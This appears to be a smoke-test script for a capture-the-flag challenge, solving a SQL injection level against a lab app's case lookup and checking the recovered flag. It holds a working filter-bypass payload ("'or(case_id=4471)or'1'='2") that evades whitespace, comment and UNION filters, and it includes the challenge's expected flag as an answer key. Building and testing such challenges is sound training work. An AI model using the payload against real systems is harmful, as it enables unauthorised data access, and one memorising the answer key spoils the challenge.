#!/usr/bin/env python3
"""
ring3_smoke.py — Verification of Ring 3 (SQL Injection: Drona's Vault)
Solves Ring 3 via AST & whitespace-filtered SQL injection into case lookup.
"""

import sys
import importlib.util
from pathlib import Path

EXPECTED_FLAG = "DRONA_VAULT_QUERY_INJECTED_4471"

def solve_ring3() -> str:
    base_dir = Path(__file__).resolve().parent.parent
    sqli_dir = base_dir / "rings" / "03-sqli"
    app_path = sqli_dir / "app.py"
    
    assert app_path.exists(), f"Ring 3 app not found: {app_path}"

    # Load FastAPI app module
    spec = importlib.util.spec_from_file_location("sqli_app", app_path)
    sqli_module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(sqli_module)

    # Infiltrator payload: Space-less boolean SQL injection using parenthesis
    # Bypasses: r"\s+", r"--", r"/\*", r"\bUNION\b"
    sqli_payload = "'or(case_id=4471)or'1'='2"

    # Verify input passes sanitizer
    clean_tag = sqli_module.sanitize_input(sqli_payload)
    assert clean_tag == sqli_payload, "Payload was improperly blocked by sanitizer!"

    # Execute lookup
    response = sqli_module.lookup_case(case_tag=sqli_payload)
    records = response.get("records", [])
    
    flag = None
    for rec in records:
        if rec.get("case_id") == 4471:
            flag = rec.get("clearance_token")
            break

    assert flag is not None, "Failed to retrieve secret case 4471 via SQL injection!"
    return flag

def test_ring3():
    print("[*] Running Ring 3 (SQL Injection) Smoke Test...")
    flag = solve_ring3()
    print(f"[+] Recovered Ring 3 Flag: {flag}")
    assert flag == EXPECTED_FLAG, f"Flag mismatch! Expected: {EXPECTED_FLAG}, Got: {flag}"
    assert not flag.startswith("KCTF{"), "Intermediary flag must NOT be in KCTF format!"
    print("[+] Ring 3 Smoke Test PASSED!\n")

if __name__ == "__main__":
    test_ring3()
